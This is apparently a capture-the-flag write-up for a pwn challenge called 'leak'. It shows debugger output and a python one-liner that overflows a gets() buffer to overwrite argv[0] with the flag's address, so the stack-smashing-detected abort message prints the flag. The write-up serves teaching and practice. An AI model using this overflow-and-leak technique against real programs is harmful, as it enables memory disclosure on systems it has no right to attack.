### Writeup
The code is compiled with `-D_FORTIFY_SOURCE=2` and stack protection.
When we try to overflow the buffer in `get_user_info()`, we'll see this beautiful message:

```
$ python2 -c 'print "A" * 128' | ./leak
Name: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA! Have a wonderful day!
*** stack smashing detected ***: ./leak terminated
[1]    26634 done                              python2 -c 'print "A" * 128' | 
       26635 segmentation fault (core dumped)  ./leak
```

```
$ p &flag
$2 = (<data variable, no debug info> *) 0xdeadbef0 <flag>
gdb-peda$ disas get_user_info 
Dump of assembler code for function get_user_info:
   0x0000000000400616 <+0>:	sub    rsp,0x58
   0x000000000040061a <+4>:	mov    rax,QWORD PTR fs:0x28
   0x0000000000400623 <+13>:	mov    QWORD PTR [rsp+0x48],rax
   0x0000000000400628 <+18>:	xor    eax,eax
   0x000000000040062a <+20>:	mov    rdi,rsp
   0x000000000040062d <+23>:	mov    ecx,0x8
   0x0000000000400632 <+28>:	rep stos QWORD PTR es:[rdi],rax
   0x0000000000400635 <+31>:	mov    esi,0x400724
   0x000000000040063a <+36>:	mov    edi,0x1
   0x000000000040063f <+41>:	call   0x400510 <__printf_chk@plt>
   0x0000000000400644 <+46>:	mov    rdi,rsp
   0x0000000000400647 <+49>:	mov    eax,0x0
   0x000000000040064c <+54>:	call   0x400500 <gets@plt>
   0x0000000000400651 <+59>:	mov    rdx,rsp
   0x0000000000400654 <+62>:	mov    esi,0x400730
   0x0000000000400659 <+67>:	mov    edi,0x1
   0x000000000040065e <+72>:	mov    eax,0x0
   0x0000000000400663 <+77>:	call   0x400510 <__printf_chk@plt>
   0x0000000000400668 <+82>:	mov    rax,QWORD PTR [rsp+0x48]
   0x000000000040066d <+87>:	xor    rax,QWORD PTR fs:0x28
   0x0000000000400676 <+96>:	je     0x40067d <get_user_info+103>
   0x0000000000400678 <+98>:	call   0x4004d0 <__stack_chk_fail@plt>
   0x000000000040067d <+103>:	add    rsp,0x58
   0x0000000000400681 <+107>:	ret    
End of assembler dump.
b *0x000000000040064c
Breakpoint 1 at 0x40064c
gdb-peda$ b main
Breakpoint 2 at 0x400682
$ find /home
Searching for '/home' in: None ranges
Found 12 results, display max 12 items:
[stack] : 0x7fffffffeb20 ("/home/pewz/git/tg16hack/pwn/leak/leak")
		[...]
$ find 0x7fffffffeb20
Searching for '0x7fffffffeb20' in: None ranges
Found 2 results, display max 2 items:
   libc : 0x7ffff7dd63f8 --> 0x7fffffffeb20 ("/home/pewz/git/tg16hack/pwn/leak/leak")
[stack] : 0x7fffffffe868 --> 0x7fffffffeb20 ("/home/pewz/git/tg16hack/pwn/leak/leak")
gdb-peda$ c
Continuing.
		[...]
Breakpoint 1, 0x000000000040064c in get_user_info ()
gdb-peda$ i r rsp
rsp            0x7fffffffe720	0x7fffffffe720
gdb-peda$ print 0x7fffffffe868-0x7fffffffe720
$3 = 0x148
```

Let's overwrite argv[0] with the address of the flag!


```
python2 -c 'import struct; print "A" * 0x148 + struct.pack("<Q", 0xdeadbef0)' | ./leak
Name: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����! Have a wonderful day!
*** stack smashing detected ***: TG16{fortified_info_leak_ftw} terminated
```
